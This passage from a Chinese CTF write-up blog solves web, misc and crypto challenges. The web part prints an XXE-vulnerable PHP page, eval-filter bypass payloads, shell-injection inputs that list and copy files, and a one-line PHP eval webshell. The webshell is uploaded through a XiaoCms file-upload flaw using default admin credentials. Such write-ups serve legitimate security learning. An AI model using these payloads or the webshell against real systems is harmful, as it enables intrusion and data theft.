4bWwpOw0KICAgICAgICB2YXIgeG1saHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOw0KICAgICAgICB4bWxodHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uICgpIHsNCiAgICAgICAgICAgIGlmICh4bWxodHRwLnJlYWR5U3RhdGUgPT0gNCkgew0KICAgICAgICAgICAgICAgIC8vIGNvbnNvbGUubG9nKHhtbGh0dHAucmVhZHlTdGF0ZSk7DQogICAgICAgICAgICAgICAgLy8gY29uc29sZS5sb2coeG1saHR0cC5yZXNwb25zZVRleHQpOw0KICAgICAgICAgICAgICAgIHZhciByZXMgPSB4bWxodHRwLnJlc3BvbnNlVGV4dDsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGl0bGUnKS50ZXh0Q29udGVudCA9IHJlcw0KICAgICAgICAgICAgfQ0KICAgICAgICB9Ow0KICAgICAgICB4bWxodHRwLm9wZW4oIlBPU1QiLCAiaW5kZXgucGhwIiwgdHJ1ZSk7DQogICAgICAgIHhtbGh0dHAuc2VuZCh4bWwpOw0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfTsNCjwvc2NyaXB0Pg0KPC9ib2R5Pg0KPC9odG1sPg&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用base64解密，得到源码，flag就在源码里</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">//$flag='flag&#123;79d10626-d27f-4569-a629-c9606d0378f2&#125;';</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token operator">!=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$res</span>  <span class="token operator">=</span> <span class="token variable">$dom</span><span class="token operator">-></span><span class="token property">textContent</span><span class="token punctuation">;</span>    <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>welcome<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./style.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>contactBody<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>wrapper<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>è¯·è¾å¥å§å<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name entry <span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Your Name<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit entry<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>func()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Submit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>shadow<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">function</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// document.getElementById().value</span>        <span class="token keyword">var</span> xml <span class="token operator">=</span> <span class="token string">''</span> <span class="token operator">+</span>            <span class="token string">'&lt;\?xml version="1.0" encoding="UTF-8"\?>'</span> <span class="token operator">+</span>            <span class="token string">'&lt;feedback>'</span> <span class="token operator">+</span>            <span class="token string">'&lt;author>'</span> <span class="token operator">+</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token operator">+</span> <span class="token string">'&lt;/author>'</span> <span class="token operator">+</span>            <span class="token string">'&lt;/feedback>'</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> xmlhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        xmlhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// console.log(xmlhttp.readyState);</span>                <span class="token comment">// console.log(xmlhttp.responseText);</span>                <span class="token keyword">var</span> res <span class="token operator">=</span> xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> res            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"index.php"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h3 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag in flag.php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\$a="</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用SESSIONID来传参，读取flag</p><p><img src="https://s3.ax1x.com/2020/11/19/DuQkdS.png"></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?code&#x3D;Show_source(Session_id(Session_start()));PHPSESSID&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><p>或者：</p><p>用scandir()读取目录源码，但必须带有参数（’.’），无法通过正则匹配</p><p>用pos()取localeconv()返回的数组的第一个元素，也就是”.”</p><p>但pos()被过滤了，用current()替换，print_r也被过滤了，尝试用大写</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?code&#x3D;Print_r(scandir(current(localeconv())));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到</p><pre class="line-numbers language-none"><code class="language-none">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; admin.php [3] &#x3D;&gt; flag.php [4] &#x3D;&gt; hahaha.php [5] &#x3D;&gt; index.php ) 1 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>hint：反转，随机数</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?code&#x3D;Var_dump(Readfile(array_rand(array_flip(scandir(Pos(localeconv()))))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一直刷新，直到看到<code>int(55)</code>，查看源码也可以看到flag</p><pre class="line-numbers language-none"><code class="language-none">readfile()   输出一个文件array_rand()   函数返回数组中的随机键名，或者如果规定函数返回不只一个键名，则返回包含随机 键名的数组。 array_flip()   函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><h3 id="神奇的登录框"><a href="#神奇的登录框" class="headerlink" title="神奇的登录框"></a>神奇的登录框</h3><p>看了宇豪师兄的博客：<a href="https://www.getflag.cn/2020/11/10/%E6%B5%85%E8%B0%88ctf%E4%B8%AD%E6%97%A0%E5%9B%9E%E6%98%BE/">浅谈ctf中无回显</a>，才知道怎么做</p><ul><li>|ls &gt; 1.txt</li></ul><pre class="line-numbers language-none"><code class="language-none">1.txtflagggg.phpindex.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>|cat flagggg.php &gt; 2.txt</li></ul><p><img src="https://s3.ax1x.com/2020/11/19/DuUbU1.png"></p><br><h3 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h3><p>参考：<a href="https://www.cnblogs.com/r00tuser/p/8000508.html">[代码审计]XiaoCms（后台任意文件上传至getshell,任意目录删除,会话固定漏洞</a></p><p>管理员账号：admin</p><p>密码：admin8888</p><br><p>在管理员后台新建表单</p><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;    &lt;body&gt;    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;129.204.81.127:6333&#x2F;admin&#x2F;index.php?c&#x3D;uploadfile&amp;a&#x3D;uploadify_upload&amp;type&#x3D;php&amp;size&#x3D;1000&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&#x2F;&gt;    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;    &lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s3.ax1x.com/2020/11/19/Dua7QS.png"></p><p>上传一句话木马</p><ul><li>test3.php</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://s3.ax1x.com/2020/11/19/DuaXon.png"></p><p>点击提交，得到文件路径</p><p><code>http://129.204.81.127:6333/data/upload/file/202011/28022b121a56bd7461ecdb38db70cd1f.php</code></p><p>用蚁剑打开，密码为cmd，在文件根目录下找到flag</p><br><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="表白"><a href="#表白" class="headerlink" title="表白"></a>表白</h3><p>用010editor打开，修改图片高度，就可以看到flag</p><p><img src="https://s3.ax1x.com/2020/11/19/Dudbp6.png"></p><br><h3 id="老烟枪"><a href="#老烟枪" class="headerlink" title="老烟枪"></a>老烟枪</h3><p>将<code>cxk.jpg</code>拖到kali，提取隐藏文件</p><pre class="line-numbers language-none"><code class="language-none">binwalk -e cxk.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到<code>flag.png</code>，用ps水平翻转，就可以看清楚flag</p><p><img src="https://s3.ax1x.com/2020/11/19/Duw8uF.png"></p><br><h3 id="lsb"><a href="#lsb" class="headerlink" title="lsb"></a>lsb</h3><p>LSB隐写，用Stegsolve打开，点Analyse-Data Extract</p><p><img src="https://s3.ax1x.com/2020/11/19/Duwj2V.png"></p><p>点击Save Bin 保存为1.png，是一张二维码，扫码就可以得到flag</p><br><h3 id="你能破解吗"><a href="#你能破解吗" class="headerlink" title="你能破解吗?"></a>你能破解吗?</h3><p>hint：压缩包密码为g2mtu加四位数字</p><p>生成密码字典</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.dic"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"g2mtu"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s3.ax1x.com/2020/11/19/DuDcE4.png"></p><p>解压得到flag.txt</p><pre class="line-numbers language-none"><code class="language-none">dGhpcyBpcyB5b3VyIGZsYWd7dzNsZTBjb21lX3RvX0cybXRVY1RmfQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用base64解密得到flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;w3le0come_to_G2mtUcTf&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="disk"><a href="#disk" class="headerlink" title="disk"></a>disk</h3><p>参考：<a href="https://blog.csdn.net/flying_bird2019/article/details/105240908">2020易博霖CTFMisc2–Disk题解</a></p><p>用提取隐藏文件</p><p><code>readme</code>：</p><pre class="line-numbers language-none"><code class="language-none">Q:where is passw0rd?A:Be Deleted.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>应该要恢复被删除的密码的，可是extundelete安装不了</p><p>只能用010editor打开disk0，查找有没有密码</p><p>尝试了好几个：<code>password</code>，<code>passw0rd</code>，<code>passwd</code>，<code>pass</code>，<code>word</code>，<code>ps</code>，<code>wd</code></p><p>最后找到一个类似密码的东西</p><pre class="line-numbers language-none"><code class="language-none">don0tgu355p@sswd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解压<code>lever1.zip</code>，得到flag.png</p><p>修改图片高度就可以得到flag</p><br><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="恺撒将军"><a href="#恺撒将军" class="headerlink" title="恺撒将军"></a>恺撒将军</h3><p>题目：</p><p>恺撒将军使用了一种技术运筹帷幄，指挥千里将士决胜千里。</p><p>敌军正好截获了一串密文 ]p{k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@</p><p>offset: 3</p><br><p>用<a href="https://blog.csdn.net/hengliang_/article/details/80496326">java String字符串与Ascii互相转换</a>的代码解密</p><ul><li>Test02</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test02</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> string <span class="token operator">=</span> <span class="token string">"]p&#123;k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@"</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ch <span class="token operator">=</span> string<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> ch<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 加空格</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">90 109 120 104 90 51 116 106 99 110 108 119 100 71 57 102 97 88 78 102 97 72 104 105 88 51 78 118 88 50 86 66 99 51 107 119 102 81 61 61 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>Test03</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test03</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> value <span class="token operator">=</span> <span class="token string">"90 109 120 104 90 51 116 106 99 110 108 119 100 71 57 102 97 88 78 102 97 72 104 105 88 51 78 118 88 50 86 66 99 51 107 119 102 81 61 61 "</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuffer</span> sbu <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token 